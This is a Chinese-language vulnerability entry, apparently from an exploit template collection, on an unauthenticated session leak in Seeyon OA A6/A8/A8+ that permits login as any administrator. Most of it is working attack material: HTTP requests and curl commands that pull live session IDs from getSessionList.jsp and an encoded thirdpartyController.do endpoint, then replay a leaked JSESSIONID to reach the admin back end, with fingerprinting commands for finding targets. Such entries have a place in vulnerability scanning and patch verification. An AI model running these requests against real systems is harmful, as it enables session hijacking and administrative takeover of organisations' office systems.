---
id: SEEYON-SESSION-LEAK
title: 致远OA Session 泄露导致任意管理员登录
product: seeyon-oa
vendor: 北京致远互联
version_affected: "A6, A8, A8+"
severity: CRITICAL
tags: [auth_bypass, session_leak, 国产, oa, 无需认证]
fingerprint: ["致远", "Seeyon", "/seeyon/", "getSessionList.jsp"]
---

## 漏洞描述

致远OA A6/A8 存在 getSessionList.jsp 接口，可未授权获取系统中在线用户的 session，利用泄露的 session 可登录任意管理员账户。

## 影响版本

- 致远OA A6
- 致远OA A8
- 致远OA A8+

## 前置条件

- 目标运行致远OA 且可通过网络访问
- session 泄露接口未做访问限制
- 需要目标系统有在线用户（存在活跃 session）
- 无需认证

## 利用步骤

### Step 1: 获取在线 session

```http
GET /seeyon/thirdpartyController.do?method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjYzMg== HTTP/1.1
Host: target
```

或直接访问:
```http
GET /yyoa/ext/https/getSessionList.jsp?cmd=getAll HTTP/1.1
Host: target
```

### Step 2: 使用 session 登录

```http
GET /seeyon/main.do HTTP/1.1
Host: target
Cookie: JSESSIONID=<leaked_session_id>
```

## Payload

### 获取在线 session

```bash
curl -s "http://target/seeyon/thirdpartyController.do?method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjYzMg=="
```

### 备用接口

```bash
curl -s "http://target/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
```

### 使用泄露 session 访问后台

```bash
curl -s -b "JSESSIONID=<leaked_session_id>" "http://target/seeyon/main.do"
```

## 验证方法

- 请求 session 泄露接口后响应中包含 `JSESSIONID` 或用户 session 列表即确认泄露漏洞
- 使用泄露的 session 访问 `/seeyon/main.do`，返回管理后台页面（非登录重定向）即确认可利用

```bash
# 获取session并验证
curl -s "http://target/yyoa/ext/https/getSessionList.jsp?cmd=getAll" | grep -i "session"
```

## 指纹确认

```bash
curl -s "http://target/seeyon/thirdpartyController.do?method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjYzMg=="
```
